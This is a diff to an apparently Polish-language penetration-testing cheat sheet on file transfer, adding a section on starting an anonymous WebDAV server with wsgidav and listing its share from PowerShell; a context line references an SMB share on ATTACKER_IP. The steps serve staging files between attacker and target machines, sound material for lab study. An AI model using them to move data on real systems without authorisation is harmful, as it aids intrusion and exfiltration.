@@ -6,6 +6,7 @@
 5. [Apache](#Apache)
 6. [Upload flask](#Upload-flask)
 7. [Using SMB server](#SMB-server)
+8. [WebDav](#webdav)
 
 # Podzial na fragmenty
 ### Mozna przed podzieleniem zakodowac do base64
@@ -125,3 +126,17 @@ Connect i browser **127.0.0.1:5000**
        1- net use \\ATTACKER_IP\share /del
     
     Tutaj takie cos bylo robione(Uprawnienia windows)
+
+
+
+# webdav
+```bash
+sudo pip3 install wsgidav cheroot
+```
+```bash
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
+```
+Polaczenie do zasobow z powershella
+```powershell
+dir \\192.168.49.128\DavWWWRoot
+```
